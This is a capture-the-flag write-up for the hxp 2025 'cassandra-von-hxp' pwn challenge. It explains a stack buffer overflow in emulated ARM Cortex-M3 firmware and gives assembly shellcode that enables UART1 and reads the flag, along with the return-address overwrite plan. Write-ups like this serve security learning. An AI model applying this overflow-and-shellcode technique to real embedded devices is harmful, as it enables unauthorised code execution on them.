# cassandra-von-hxp

## TL; DR
- Stack buffer overflow in LM3S6965EVB board (ARM Cortex-M3), shellcode to enable UART1 & read from UART1

## Challenge Description

- This challenge is the continuation for orakel-von-hxp in hxp CTF 2025, you would need the flag for [orakel-von-hxp](https://github.com/Iokete/writeups/tree/main/pwn/hxp2025/orakel-von-hxp) in order to decode the contents of this challenge. 

`echo -n 'hxp{at_l3as7_y0u_f0und_s7rncmp_-_r0p_sp0ns0r3d_by_n3wl1b___2739b2436edfb292}' | openssl aes-256-cbc -pbkdf2 -iter 100000 -salt -d -pass stdin -in cassandra-von-hxp.tar.xz.enc -out cassandra-von-hxp.tar.xz`

> 🤡 dev for 🤡 software

- Category: **pwn**

## Exploitation

### Finding the vulnerability

- The main difference between [orakel-von-hxp](https://github.com/Iokete/writeups/tree/main/pwn/hxp2025/orakel-von-hxp) and this challenge, is that they included a QEMU patch in the files. This patch included a fix that makes sure the UART1 is disabled on start. I recommend reading orakel writeup first and then coming back to this one.

- There is a clear stack-based buffer overflow vulnerability in the `main` function, where we are reading 0x200 bytes to a buffer with size 0x20.

```c
...
uint32_t buffer[0x20];
char* sbuf = (char*) buffer;
serial_fgets(sbuf, 0x200, uart0);
...
```

- The loop follows the next steps:
    * Asks for an input, and breaks if it matches an specific string `I am enlightened`.
    * Prints our input.
    * Uses the start of the buffer as a seed to generate a random long number.
    * 1000 ms delay
    * Checks if UART1 is enabled, if so, prints a message. If it is not enabled it will print the contents of the random number as an address.

- The randomization algorithm is defined inside mtwister.c file (MT19937 Algorithm for the Mersenne Twister). 

### Exploiting the vulnerability

- Looking at the memory pages in GDB, I noticed that the stack was executable and the buffer address was inside the stack.

```nasm
pwndbg> x/60wx 0x2000ff58
0x2000ff58:	0x41414141	0x0000000a	0x00000000	0x00000000
0x2000ff68:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ff78:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ff88:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ff98:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffa8:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffb8:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffc8:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffd8:	0x1b9ccd4d	0x00000000	0x05c00382	0x2000ff58 <-- *buffer
0x2000ffe8:	0x2000fff0	0x00000139	0x20000a0c	0x00001d38
                        ^ This is the return address (notice 0x138 + 0x1)
```

- My idea then was to write a shellcode that reads bytes in a loop from UART1 until it finds a `}` byte. Flood the stack with padding until the buffer address, set it to its original value to prevent errors in a second call, and overwrite the return address with the address of my shellcode + 1. I placed it 0x10 bytes after the start of the buffer, because I noticed it would be less error prone to 2 two different calls, 1 to write the shellcode and overwrite the stack, and the second one to send the string needed to break out of the loop. It is necessary to write the return address wanted +1 to indicate the CPU that we want to execute it Thumb mode, if we don't do this it won't work.

- To read the flag I used the same code as in [orakel-von-hxp](https://github.com/Iokete/writeups/tree/main/pwn/hxp2025/orakel-von-hxp), but it won't work because of the QEMU patch added to this challenge. To make it work, we had to enable UART1->CTL bit. As we can see [here](https://software-dl.ti.com/simplelink/esd/simplelink_lowpower_f3_sdk/9.12.00.19/exports/docs/driverlib/cc27xx/register_descriptions/CPU_MMAP/UART1.html#CTL) the CTL bit is at offset 0x30 from the UART1 base address: 0x4000d030. Before enabling it, we can see it holds the value 0x300

```nasm
pwndbg> x/wx 0x4000d030
0x4000d030: 0x00000300
```

- We just have to add to our shellcode some functionality that moves the value 0x301 into this address, and continue with our old code.

```nasm
		ldr r6, =0x301              @ r6 holds 0x301
		ldr r3, =0x0
		ldr r5, =0x7d
	start:
		movw r4, 0xffff
		movt r4, 0x00ff
	delay:
		subs r4, 1
		cmp r4, r3
		bne delay
	loop:
	    ldr r0, =0x4000D000
	    str r6, [r0, 0x30]          @ store at 0x4000d030 the value at r6
	    ldr r1, [r0]    
	    tst r1, #0xFF        
	    beq start    

	    ldr r2, =0x4000C000  
	    str r1, [r2]
	    cmp r1, r5
	    beq end         
	    b start
	end:  

```

### Getting the flag

![flag](assets/cassandra.gif)

### Solvers

You can download the solver [here](assets/solver.py).